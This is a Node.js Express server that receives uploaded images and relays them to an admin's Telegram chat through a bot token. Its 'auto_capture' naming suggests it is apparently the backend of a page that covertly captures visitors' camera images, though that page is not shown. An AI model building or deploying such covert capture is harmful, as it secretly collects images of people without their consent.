require('dotenv').config();
const express = require('express');
const multer = require('multer');
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
const FormData = require('form-data');

const upload = multer({ storage: multer.memoryStorage() });
const app = express();
const PORT = process.env.PORT || 3000;

// Serve static files from public folder
app.use(express.static('public'));

// API Endpoint to receive image and send to Telegram
app.post('/upload', upload.single('image'), async (req, res) => {
    try {
        const token = process.env.BOT_TOKEN;
        const chatId = process.env.ADMIN_CHAT_ID;

        if (!token || !chatId) {
            return res.status(500).json({ error: 'Config missing' });
        }

        // Prepare form data for Telegram API
        const form = new FormData();
        form.append('chat_id', chatId);
        
        // Append image buffer
        form.append('photo', req.file.buffer, {
            filename: 'auto_capture.jpg',
            contentType: req.file.mimetype
        });

        // Send to Telegram
        const response = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
            method: 'POST',
            body: form
        });

        const data = await response.json();
        
        if (data.ok) {
            res.json({ success: true, message: 'Image captured and sent!' });
        } else {
            res.status(500).json({ error: data.description });
        }

    } catch (error) {
        console.error(error);
        res.status(500).json({ error: 'Server Error' });
    }
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
